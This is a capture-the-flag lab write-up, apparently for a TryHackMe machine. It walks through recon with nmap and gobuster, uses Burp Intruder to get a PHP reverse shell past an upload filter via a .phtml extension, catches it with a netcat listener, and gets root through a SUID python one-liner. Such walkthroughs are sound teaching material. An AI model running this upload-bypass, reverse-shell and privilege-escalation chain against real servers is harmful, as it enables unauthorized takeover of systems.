# Rootme- A CTF for beginners
- Reconnaissance
- Getting a shell
- Privilege Escalation

![image](./ss.png)

##  Steps-

# 1
- Running the openvpn file ```sudo openvpn CyberSumit.ovpn```
-  Setting the IP as rootme.com
# 2
- Scan the target IP with nmap
```sudo nmap -Pn -sV -vvv -oN npsv.txt```
- Only 2 port numbers are running 22,80.
(no -p- signifies first 1000 ports shall  be scanned)
- Search for known vulnerabilities in Apache 2.4.29
- No Exploits found
# 3.Finding Hidden Directories with gobuster
- ``` gobuster dir -u http://rootme.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```
- we find js,css,uploads and panel as the hidden directories
- -whatever we upload in panel appears in uploads.
# 4.Getting the Revershell
- Look for the php payload and copy it to the present directory and upload it to panel with brute forced extensions to get a shell.
- Open burpsuite and in the proxy setting set the port number to 8085 and install the foxyproxy addon in the browser. Create a Burp proxy in foxy proxy with the port 8085 and IP as given in Burpsuite.
- Enable the intercept in proxy(BurpSuite) and as we upload a file in panel , the requests are shown in the burpsuite then we can alter some things in the request and forward it to the backend with the help of proxy.
- In a similar way we move it to the intruder and select the extension of php file and add it to brute force.
- the .phtml extension was found suitable after the attack.
- Make Sure to add the Host IP and port number to the php file.
- start the netcat listener -```nc -lvnp 2222```
- as we upload the phtml file to panel and then click on it from the uploads we can get a connection in out kali which has an unstable terminal which we need to stabilize with python commands.
 ```cd Desktop/TryHackMe/rootme```
```cp -r /usr/share/webshells/php/php-reverse-shell.php .```
# Command for Terminal Stabilization
``` python -c 'import pty; pty.spawn("/bin/bash")'```

-  ```export TERM=xterm```

# Command for Privilege Escalations

- Visit ``` python -c 'import pty; pty.spawn("/bin/bash")'```

-  ```export TERM=xterm```
- Copy the SUID command and paste it in the kali terminal to get the root privilege in machine 
- ```python -c 'import os; os.execl("/bin/sh", "sh", "-p")'```
- Find out the FLAGS using suitable commands 
- Command to search a particular name in the system -- ```find / -name user.txt 2>/dev/null```
- 



##KnowledgePlus
- To know your IP go to dnsleaktest.com and to check your IP score go to scamalytics.com 
- Directory-trans - if we can access an image in a platform by the URL then we should try to visit the upload directory, if we are not getting 403 or we are able to bypass the status then the website is vulnerable to directory trans.
- Using page source for directory trans- we can open the page source and find out the hidden directories with the manual testing 
